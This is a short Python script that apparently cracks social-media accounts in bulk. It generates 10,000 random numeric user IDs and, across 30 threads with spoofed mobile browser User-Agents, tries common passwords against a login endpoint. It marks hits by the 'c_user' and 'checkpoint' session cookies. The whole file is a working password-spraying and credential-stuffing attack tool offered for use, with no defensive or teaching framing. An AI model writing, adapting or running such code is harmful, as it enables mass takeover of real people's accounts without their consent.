import os
import random
import requests
from concurrent.futures import ThreadPoolExecutor

# Random User-Agent list
ugen = [
    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36'
]

# Random ID generator
def random_clone():
    users = []
    for _ in range(10000):
        uid = random.randint(1111111111, 9999999999)
        users.append(str(uid))
    
    print(f"{len(users)} random user IDs generated.")
    return users

# Clone user accounts
def clone_user(uid, password_list):
    session = requests.Session()
    user_agent = random.choice(ugen)
    headers = {'User-Agent': user_agent}
    
    for password in password_list:
        data = {"email": uid, "pass": password}
        response = session.post("https://example.com/login", data=data, headers=headers)
        
        if "c_user" in session.cookies:
            print(f"[OK] {uid} | {password}")
            break
        elif "checkpoint" in session.cookies:
            print(f"[CP] {uid} | {password}")
            break

# Main function to execute cloning
def main():
    users = random_clone()
    password_list = ["password123", "qwerty", "user2023"]
    
    with ThreadPoolExecutor(max_workers=30) as executor:
        for uid in users:
            executor.submit(clone_user, uid, password_list)

if __name__ == "__main__":
    main()
